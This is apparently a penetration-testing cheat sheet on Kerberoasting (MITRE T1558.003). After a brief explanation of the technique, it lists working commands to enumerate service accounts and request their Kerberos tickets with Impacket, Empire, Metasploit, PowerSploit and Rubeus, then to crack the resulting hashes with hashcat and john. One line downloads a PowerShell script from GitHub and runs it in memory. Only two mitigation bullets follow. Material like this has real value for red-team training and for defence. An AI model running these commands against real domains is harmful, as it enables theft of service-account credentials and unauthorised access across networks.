---
description: https://attack.mitre.org/techniques/T1558/003/
---

# Kerberoasting

**ATT\&CK ID:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/)

**Permissions Required:** <mark style="color:green;">**Valid Domain Account**</mark> | <mark style="color:orange;">**Ability to sniff domain traffic**</mark>

**Description**

Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force.

Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).

Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plain text credentials.

Cracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.

[\[Source\]](https://attack.mitre.org/techniques/T1558/003/)

## Enumeration Techniques - Linux

**Python - Impacket**

```python
GetUserSPNs.py [Domain]/[User]:<Password> -dc-ip [IP] -request
```

## Enumeration Techniques - Windows

**CMD**

<pre class="language-bash"><code class="lang-bash"><strong># Gets all SPNs, Includes machine account SPNs
</strong><strong>setspn -T [Domain] -Q */*
</strong></code></pre>

**Powerview**

```powershell
Get-DomainUser -SPN | Select SamAccountName,DisplayName,ServicePrincipalName
```

## Exploit Techniques - Linux

### Empire

```bash
# PowerShell
powershell/credentials/invoke_kerberoast

# C#
csharp/SharpSploit.Enumeration/Kerberoast
```

![](<../../../../.gitbook/assets/image (157) (2).png>)

### Impacket

```python
GetUserSPNs.py [Domain]/[User]:<Password> -dc-ip [IP] -request
```

![](<../../../../.gitbook/assets/image (352).png>)

### Metasploit

```
use auxiliary/gather/get_user_spns
```

## Exploit Techniques - Windows&#x20;

**Invoke-Kerberoast (PowerSploit)**

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>IEX(IWR https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1);Invoke-Kerberoast | FL
</strong></code></pre>

![](<../../../../.gitbook/assets/invoke-kerbroast (1).png>)

### Rubeus

**URL (Binary):** [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

**URL (PowerShell):** [https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1) (binary)

```python
# Kerberoast all users in Domain and output to file
.\Rubeus.exe kerberoast /simple /outfile:C:\Temp\Kerbhashes.txt

# Kerberoast all users in alternative Domain
.\Rubeus.exe kerberoast /nowrap /domain:[Domain]

# All Users in OU
.\Rubeus.exe kerberoast /ou:OU=Service_Accounts,DC=Security,DC=local /nowrap

# Specific users
.\Rubeus.exe kerberoast /user:[User] /nowrap

# List statistics about found Kerberoastable accounts (Quiet)
.\Rubeus.exe kerberoast /stats
```

![](<../../../../.gitbook/assets/rubeus-kerberoast (1).png>)

## Cracking Techniques

```bash
# Windows
hashcat64.exe -m 13100 c:Hashes.txt rockyou.txt

# Linux
john --wordlist rockyou.txt Hashes.txt --format=krb5tgs
hashcat -m 13100 -a 3 Hashes.txt rockyou
```

## Mitigation

* Ensure service account passwords are longer than 25 characters
* Make use of Group Service Managed Accounts (GMSA) where possible
